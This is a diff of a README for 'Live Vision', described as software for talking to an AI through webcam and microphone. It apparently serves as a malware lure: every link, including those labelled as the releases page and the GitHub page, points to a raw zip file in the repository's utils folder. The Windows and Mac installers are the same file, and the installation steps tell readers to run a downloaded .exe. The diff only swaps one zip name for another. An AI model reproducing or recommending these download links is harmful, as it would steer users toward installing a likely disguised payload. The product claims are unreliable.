@@ -4,7 +4,7 @@
 Welcome to Live Vision! This software allows you to connect with advanced AI through live video and audio streams. It opens new possibilities for interaction using sensory data, beyond traditional text-based chat.
 
 ## 📥 Download Now
-[![Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip%20Live%20Vision-latest-brightgreen)](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip)
+[![Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip%20Live%20Vision-latest-brightgreen)](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip)
 
 ## 📋 Features
 - **Real-Time Streaming:** Access live video frames and audio data.
@@ -24,11 +24,11 @@ To successfully run Live Vision, ensure your system meets the following requirem
 Follow these steps to download and install Live Vision:
 
 1. **Visit the Releases Page:** Click the link below to reach the download page.
-   [Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip)
+   [Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip)
 
 2. **Select the Latest Release:** On the releases page, locate the latest version of Live Vision. Look for the version number formatted as “vX.X.X.”
 
-3. **Download the Installer:** Click on the appropriate file for your operating system to download. The file may be named something like `https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip` for Windows or `https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip` for Mac.
+3. **Download the Installer:** Click on the appropriate file for your operating system to download. The file may be named something like `https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip` for Windows or `https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip` for Mac.
 
 4. **Run the Installer:**
    - For Windows, locate the downloaded `.exe` file in your downloads folder and double-click it to start the installation.
@@ -41,7 +41,7 @@ Follow these steps to download and install Live Vision:
 7. **Begin Interaction:** Follow the on-screen prompts to start interacting with the AI. You can use your webcam and microphone for a full experience.
 
 ## 🔗 More Information
-For additional details, updates, and troubleshooting, visit our [GitHub page](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip).
+For additional details, updates, and troubleshooting, visit our [GitHub page](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip).
 
 ## 📞 Support
 If you encounter issues or have questions, you can reach out to the community or submit an issue on GitHub. We are dedicated to helping you have the best experience with Live Vision.
@@ -61,6 +61,6 @@ live-vision is related to the following topics:
 
 ## 📥 Download & Install Again
 Remember, you can download Live Vision anytime from the following link:
-[Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live_vision_3.7.zip) 
+[Download Live Vision](https://github.com/polygram3/live-vision/raw/refs/heads/main/utils/live-vision-1.5.zip) 
 
 Enjoy exploring the next generation of human-computer interaction with Live Vision!
